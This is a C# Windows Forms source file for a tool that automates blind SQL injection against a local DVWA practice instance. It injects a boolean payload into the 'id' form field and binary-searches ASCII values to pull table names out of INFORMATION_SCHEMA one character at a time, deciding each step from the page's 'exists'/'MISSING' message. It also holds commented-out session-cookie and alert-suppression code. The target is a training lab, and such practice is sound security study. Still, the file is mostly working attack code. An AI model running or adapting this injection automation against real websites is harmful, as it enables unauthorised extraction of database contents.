using mshtml;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tool_SqlInjectionBlind_Dvwa
{
    public partial class frm_Main : Form
    {
        public frm_Main()
        {
            InitializeComponent();

            //wbro_Brower.Url = new Uri("http://localhost/dvwa/index.php");


            //string header = "Cookie: security = impossible; PHPSESSID = sg1j74srfddt59lhg6pteia3k5";
            //wbro_Brower.Navigate("http://localhost/dvwa/index.php", "", null, header);
            wbro_Brower.Navigate("http://localhost/dvwa/login.php");

            //InternetSetCookie("http://localhost/dvwa/index.php", null, "security=impossible; PHPSESSID=sg1j74srfddt59lhg6pteia3k5");
            //wbro_Brower.Navigate("http://localhost/dvwa/index.php");

            //        wbro_Brower.Navigated +=
            //new WebBrowserNavigatedEventHandler(
            //    (object sender, WebBrowserNavigatedEventArgs args) => {
            //        Action<HtmlDocument> blockAlerts = (HtmlDocument d) => {
            //            HtmlElement h = d.GetElementsByTagName("head")[0];
            //            HtmlElement s = d.CreateElement("script");
            //            IHTMLScriptElement e = (IHTMLScriptElement)s.DomElement;
            //            e.text = "window.alert=function(){};";
            //            h.AppendChild(s);
            //        };
            //        WebBrowser b = sender as WebBrowser;
            //        blockAlerts(b.Document);
            //        for (int i = 0; i < b.Document.Window.Frames.Count; i++)
            //            try { blockAlerts(b.Document.Window.Frames[i].Document); }
            //            catch (Exception) { };
            //    }
            //);

            wbro_Brower.ScriptErrorsSuppressed = true;
        }

        private string html;
        private int left = 0;
        private int right = 255;
        private int mid = 127;
        private bool btn_Click = false;
     
        private string sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_NAME>'u' LIMIT 1), 2,1))) >= 127 #";

        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);

        private void btn_Power_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("App will be shutdown. Are you sure?", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                System.Windows.Forms.Application.Exit();
        }

        private void btn_ViewHTHL_Click(object sender, EventArgs e)
        {
            frm_ViewHTML view_HTML = new frm_ViewHTML(this.html);
            view_HTML.ShowDialog();
        }

        private void wbro_Brower_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            txt_Url.Text = wbro_Brower.Url.ToString();
            html = wbro_Brower.DocumentText;

            HtmlElementCollection h = wbro_Brower.Document.GetElementsByTagName("pre");
            if(h.Count != 0)
                textBox1.Text = h[0].InnerHtml;
            ////

            if(btn_Click)
            {
                if (textBox1.Text.Contains("User ID exists in the database.")) //true
                {
                    if(left == mid)
                    {
                        label1.Text += mid.ToString();
                        btn_Click = false;
                        return;
                    }

                    left = mid;
                    if (right == left) //done
                    {
                        label1.Text += mid.ToString();
                        return;
                    }
                }
                else if (textBox1.Text.Contains("User ID is MISSING from the database.")) //false
                {
                    right = mid;
                }
                mid = Convert.ToInt32(Find_Ascii_Compare(left, right));
                sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_NAME>'u' LIMIT 1), 2,1))) >=" + Find_Ascii_Compare(left, right) + " #";
                button1.PerformClick();
            }
        }

        private void btn_Go_Click(object sender, EventArgs e)
        {
            if(txt_Url.Text == String.Empty)
            {
                txt_Url.Focus();
            }
            else
            {
                wbro_Brower.Url = new Uri(txt_Url.Text);
            }
        }
        
        private static string Find_Ascii_Compare(int left, int right)
        {
            return "" + (((right - left) / 2) + left);
        }

        
        private void button1_Click(object sender, EventArgs e)
        {
            btn_Click = true;
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("id")[0].SetAttribute("value", sql);
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click");

            
           // h[0].GetAttribute();
            //textBox1.Text = wbro_Brower.
        }


    }
}
